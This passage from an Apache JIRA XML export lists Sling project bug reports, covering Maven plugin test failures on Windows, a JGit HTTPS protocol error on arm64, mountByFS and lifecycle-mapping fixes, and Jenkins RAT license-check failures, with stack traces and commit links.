                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 10 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z17rfs:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11542] sling-maven-plugin: GenerateAdapterMetadataMojoTest fails under Windows</title>
                <link>https://issues.apache.org/jira/browse/SLING-11542</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;with release 3.0.0, this unit test fails on windows:&lt;/p&gt;
&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;[ERROR] Tests run: 1, Failures: 0, Errors: 1, Skipped: 0, Time elapsed: 1.856 s &amp;lt;&amp;lt;&amp;lt; FAILURE! - in org.apache.sling.maven.bundlesupport.GenerateAdapterMetadataMojoTest
[ERROR] org.apache.sling.maven.bundlesupport.GenerateAdapterMetadataMojoTest.testExecute  Time elapsed: 1.856 s  &amp;lt;&amp;lt;&amp;lt; ERROR!
java.nio.file.InvalidPathException: Illegal char &amp;lt;:&amp;gt; at index 2: /D:/Develop/OpenSource/sling-git/sling-maven-plugin/target/test-classes/
        at java.base/sun.nio.fs.WindowsPathParser.normalize(WindowsPathParser.java:182)
        at java.base/sun.nio.fs.WindowsPathParser.parse(WindowsPathParser.java:153)
...
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;</description>
                <environment></environment>
        <key id="13476834">SLING-11542</key>
            <summary>sling-maven-plugin: GenerateAdapterMetadataMojoTest fails under Windows</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="5" iconUrl="https://issues.apache.org/jira/images/icons/priorities/trivial.svg">Trivial</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="sseifert">Stefan Seifert</assignee>
                                    <reporter username="sseifert">Stefan Seifert</reporter>
                        <labels>
                    </labels>
                <created>Mon, 15 Aug 2022 13:36:22 +0000</created>
                <updated>Sun, 21 Aug 2022 09:14:06 +0000</updated>
                            <resolved>Mon, 15 Aug 2022 13:38:54 +0000</resolved>
                                                    <fixVersion>Sling Maven Plugin 3.0.2</fixVersion>
                                    <component>Maven Plugins and Archetypes</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17579715" author="sseifert@pro-vision.de" created="Mon, 15 Aug 2022 13:38:54 +0000"  >&lt;p&gt;fixed: &lt;a href=&quot;https://github.com/apache/sling-maven-plugin/commit/dbf3040b5e0cd49089ce1a8086e4e8361375b805&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-maven-plugin/commit/dbf3040b5e0cd49089ce1a8086e4e8361375b805&lt;/a&gt;&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 10 weeks, 2 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z17rdc:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11539] update-local-site fails on arm64v8 with Java 17</title>
                <link>https://issues.apache.org/jira/browse/SLING-11539</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;The following error was encountered when running the Docker image on an M1 Pro MacBook Pro:&lt;/p&gt;
&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;docker run --rm -it --env-file=./docker-env apache/sling-cli release update-local-site -r 2662
org.eclipse.jgit.api.errors.JGitInternalException: Exception caught during execution of fetch command
	at org.eclipse.jgit.api.FetchCommand.call(FetchCommand.java:260)
	at org.eclipse.jgit.api.CloneCommand.fetch(CloneCommand.java:302)
	at org.eclipse.jgit.api.CloneCommand.call(CloneCommand.java:200)
	at org.apache.sling.cli.impl.release.UpdateLocalSiteCommand.ensureRepo(UpdateLocalSiteCommand.java:102)
	at org.apache.sling.cli.impl.release.UpdateLocalSiteCommand.call(UpdateLocalSiteCommand.java:67)
	at org.apache.sling.cli.impl.release.UpdateLocalSiteCommand.call(UpdateLocalSiteCommand.java:41)
	at picocli.CommandLine.executeUserObject(CommandLine.java:1701)
	at picocli.CommandLine.access$900(CommandLine.java:146)
	at picocli.CommandLine$RunLast.handle(CommandLine.java:2059)
	at picocli.CommandLine$RunLast.handle(CommandLine.java:2026)
	at picocli.CommandLine$AbstractParseResultHandler.execute(CommandLine.java:1893)
	at picocli.CommandLine.execute(CommandLine.java:1822)
	at org.apache.sling.cli.impl.CommandProcessor.runCommand(CommandProcessor.java:110)
	at org.apache.sling.cli.impl.ExecutionTrigger.lambda$activate$0(ExecutionTrigger.java:33)
	at java.base/java.lang.Thread.run(Unknown Source)
Caused by: org.eclipse.jgit.errors.NotSupportedException: Invalid URL https://github.com/apache/sling-site.git
	at org.eclipse.jgit.transport.TransportHttp.setURI(TransportHttp.java:308)
	at org.eclipse.jgit.transport.TransportHttp.&amp;lt;init&amp;gt;(TransportHttp.java:280)
	at org.eclipse.jgit.transport.TransportHttp$1.open(TransportHttp.java:208)
	at org.eclipse.jgit.transport.Transport.open(Transport.java:553)
	at org.eclipse.jgit.transport.Transport.open(Transport.java:429)
	at org.eclipse.jgit.transport.Transport.open(Transport.java:308)
	at org.eclipse.jgit.transport.Transport.open(Transport.java:277)
	at org.eclipse.jgit.api.FetchCommand.call(FetchCommand.java:235)
	... 14 more
Caused by: java.net.MalformedURLException: Unknown protocol: https
	at java.base/java.net.URL.&amp;lt;init&amp;gt;(Unknown Source)
	at java.base/java.net.URL.&amp;lt;init&amp;gt;(Unknown Source)
	at java.base/java.net.URL.&amp;lt;init&amp;gt;(Unknown Source)
	at org.eclipse.jgit.transport.TransportHttp.toURL(TransportHttp.java:291)
	at org.eclipse.jgit.transport.TransportHttp.setURI(TransportHttp.java:305)
	... 21 more
Caused by: java.lang.IllegalStateException: Unknown protocol: https
	at org.apache.felix.framework.URLHandlersStreamHandlerProxy.parseURL(URLHandlersStreamHandlerProxy.java:373)
	... 26 more
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;</description>
                <environment></environment>
        <key id="13476591">SLING-11539</key>
            <summary>update-local-site fails on arm64v8 with Java 17</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="5" iconUrl="https://issues.apache.org/jira/images/icons/statuses/resolved.png" description="A resolution has been taken, and it is awaiting verification by reporter. From here issues are either reopened, or are closed.">Resolved</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="radu">Radu Cotescu</assignee>
                                    <reporter username="radu">Radu Cotescu</reporter>
                        <labels>
                    </labels>
                <created>Fri, 12 Aug 2022 15:50:32 +0000</created>
                <updated>Tue, 16 Aug 2022 09:54:30 +0000</updated>
                            <resolved>Tue, 16 Aug 2022 09:54:30 +0000</resolved>
                                                    <fixVersion>Committer CLI 1.0.0</fixVersion>
                                    <component>Tooling</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                        <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 10 weeks, 5 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z17pvk:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11537] Restrict &quot;mountByFS&quot; parameter to files outside the Maven repository</title>
                <link>https://issues.apache.org/jira/browse/SLING-11537</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Currently the &lt;tt&gt;mountByFS&lt;/tt&gt; parameter is supported by both goals &lt;tt&gt;install&lt;/tt&gt; and &lt;tt&gt;install-file&lt;/tt&gt;. The latter also allows to install bundles from a Maven repository (after resolving it) but configuring a Filesystem Resource Provider for that location is never useful, as the local Maven repository path should not be abused for maintaining Sling Initial Content directly on the file system.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13476526">SLING-11537</key>
            <summary>Restrict &quot;mountByFS&quot; parameter to files outside the Maven repository</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="kwin">Konrad Windszus</assignee>
                                    <reporter username="kwin">Konrad Windszus</reporter>
                        <labels>
                    </labels>
                <created>Fri, 12 Aug 2022 08:03:23 +0000</created>
                <updated>Sun, 21 Aug 2022 09:14:06 +0000</updated>
                            <resolved>Fri, 12 Aug 2022 14:24:58 +0000</resolved>
                                                    <fixVersion>Sling Maven Plugin 3.0.2</fixVersion>
                                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="1200">20m</timespent>
                                <comments>
                            <comment id="17578993" author="kwin" created="Fri, 12 Aug 2022 14:24:58 +0000"  >&lt;p&gt;Fixed in &lt;a href=&quot;https://github.com/apache/sling-maven-plugin/commit/e7f86a2d18d2e1669db7ec2a15c35e2d5a1a9281&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-maven-plugin/commit/e7f86a2d18d2e1669db7ec2a15c35e2d5a1a9281&lt;/a&gt;.&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 10 weeks, 5 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z17ph4:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11536] Remove wrong LifecycleMapping metadata</title>
                <link>https://issues.apache.org/jira/browse/SLING-11536</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;The sling-maven-plugin contains Plexus component metadata for a &lt;tt&gt;org.apache.maven.lifecycle.mapping.DefaultLifecycleMapping&lt;/tt&gt; with role &lt;tt&gt;assembly&lt;/tt&gt; (&lt;a href=&quot;https://github.com/apache/sling-maven-plugin/blob/e5da7210376d1951c2fa4ce76f69cb7632cee36f/sling-maven-plugin/src/main/resources/META-INF/plexus/components.xml#L20&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-maven-plugin/blob/e5da7210376d1951c2fa4ce76f69cb7632cee36f/sling-maven-plugin/src/main/resources/META-INF/plexus/components.xml#L20&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;Although this only is active if &lt;tt&gt;sling-maven-plugin&lt;/tt&gt; is used with &lt;tt&gt;&amp;lt;extensions&amp;gt;true&amp;lt;/extensions&amp;gt;&lt;/tt&gt; it is wrong in any case, as it defines a mapping for packaging &quot;assembly&quot; and also only binds Maven default plugin goals.&lt;/p&gt;

&lt;p&gt;As the &lt;tt&gt;sling-maven-plugin&lt;/tt&gt; doesn&apos;t do any packaging nor defines a custom packaging, providing a custom &lt;tt&gt;DefaultLifecycleMapping&lt;/tt&gt; is not necessary and in the worst case might have negative side-effects.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13476525">SLING-11536</key>
            <summary>Remove wrong LifecycleMapping metadata</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="kwin">Konrad Windszus</assignee>
                                    <reporter username="kwin">Konrad Windszus</reporter>
                        <labels>
                    </labels>
                <created>Fri, 12 Aug 2022 07:58:42 +0000</created>
                <updated>Sun, 21 Aug 2022 09:14:06 +0000</updated>
                            <resolved>Fri, 12 Aug 2022 14:10:38 +0000</resolved>
                                                    <fixVersion>Sling Maven Plugin 3.0.2</fixVersion>
                                    <component>Maven Plugins and Archetypes</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="1200">20m</timespent>
                                <comments>
                            <comment id="17578990" author="kwin" created="Fri, 12 Aug 2022 14:10:38 +0000"  >&lt;p&gt;Fixed in &lt;a href=&quot;https://github.com/apache/sling-maven-plugin/commit/eeca5fb6fc5f280a7043638b97f9ab6c8692e275&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-maven-plugin/commit/eeca5fb6fc5f280a7043638b97f9ab6c8692e275&lt;/a&gt;.&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            3 years, 10 weeks, 5 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z17pgw:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11530] Jenkins Maven Build Failure due to violating rat checks in multimodule build</title>
                <link>https://issues.apache.org/jira/browse/SLING-11530</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Even after the fixes of &lt;a href=&quot;https://issues.apache.org/jira/browse/SLING-11401&quot; title=&quot;Jenkins: Properly isolate workspace directories for parallel stages&quot; class=&quot;issue-link&quot; data-issue-key=&quot;SLING-11401&quot;&gt;&lt;del&gt;SLING-11401&lt;/del&gt;&lt;/a&gt; the following error can still be experienced for multi-module builds:&lt;/p&gt;

&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
[INFO] --- apache-rat-plugin:0.14:check (rat-check) @ sling-maven-plugin.reactor ---
[...
[WARNING] Files with unapproved licenses:
  local-snapshots-dir/org/apache/sling/maven-metadata.xml.sha1
  local-snapshots-dir/org/apache/sling/maven-metadata.xml
  local-snapshots-dir/org/apache/sling/maven-metadata.xml.md5
...
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  01:53 min
[INFO] Finished at: 2022-08-11T15:53:48Z
[INFO] ------------------------------------------------------------------------
[INFO] [jenkins-event-spy] Generated /home/jenkins/jenkins-agent/workspace/odules_sling-maven-plugin_master/jdk_1.8_latest@tmp/withMavene7346aae/maven-spy-20220811-155155-4511382858674172539989.log
[ERROR] Failed to execute goal org.apache.rat:apache-rat-plugin:0.14:check (rat-check) on project sling-maven-plugin.reactor: Too many files with unapproved license: 33 See RAT report in: /home/jenkins/jenkins-agent/workspace/odules_sling-maven-plugin_master/jdk_1.8_latest/target/rat.txt -&amp;gt; [Help 1]
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;(e.g. in &lt;a href=&quot;https://ci-builds.apache.org/job/Sling/job/modules/job/sling-maven-plugin/job/master/119/console&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://ci-builds.apache.org/job/Sling/job/modules/job/sling-maven-plugin/job/master/119/console&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;The reason is that the files to be deployed are staged from other modules in the reactor root directory first, and only afterwards the RAT check is being performed.&lt;/p&gt;

&lt;p&gt;As we cannot use the target file for the staged artifacts either (as being cleaned after being populated) we need to rely on a directory which is excluded by default from RAT checks.&lt;/p&gt;</description>
                <environment></environment>
        <key id="13476417">SLING-11530</key>
            <summary>Jenkins Maven Build Failure due to violating rat checks in multimodule build</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="5" iconUrl="https://issues.apache.org/jira/images/icons/statuses/resolved.png" description="A resolution has been taken, and it is awaiting verification by reporter. From here issues are either reopened, or are closed.">Resolved</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="kwin">Konrad Windszus</assignee>
                                    <reporter username="kwin">Konrad Windszus</reporter>
                        <labels>
                    </labels>
                <created>Thu, 11 Aug 2022 16:01:07 +0000</created>
                <updated>Wed, 17 Aug 2022 09:02:58 +0000</updated>
                            <resolved>Wed, 17 Aug 2022 09:02:58 +0000</resolved>
                                                                    <component>CI</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                    <progress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </progress>
                                    <aggregateprogress percentage="100">
                                    <originalProgress>
                                                    <row percentage="0" backgroundColor="#89afd7"/>
                                                    <row percentage="100" backgroundColor="transparent"/>
                                            </originalProgress>
                                                    <currentProgress>
                                                    <row percentage="100" backgroundColor="#51a825"/>
                                                    <row percentage="0" backgroundColor="#ec8e00"/>
                                            </currentProgress>
                            </aggregateprogress>
                                            <timeestimate seconds="0">0h</timeestimate>
                            <timespent seconds="600">10m</timespent>
                                <comments>
                            <comment id="17578549" author="kwin" created="Thu, 11 Aug 2022 16:05:19 +0000"  >&lt;p&gt;Using a hidden folder name (starting with &quot;.&quot;) should be pretty safe, as this folder is excluded from being checked since ages: &lt;a href=&quot;https://github.com/apache/sling-parent/blob/b5cc31e53b9a33c1ba43da27fb07628d9849b206/sling-parent/pom.xml#L235&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-parent/blob/b5cc31e53b9a33c1ba43da27fb07628d9849b206/sling-parent/pom.xml#L235&lt;/a&gt;&lt;/p&gt;</comment>
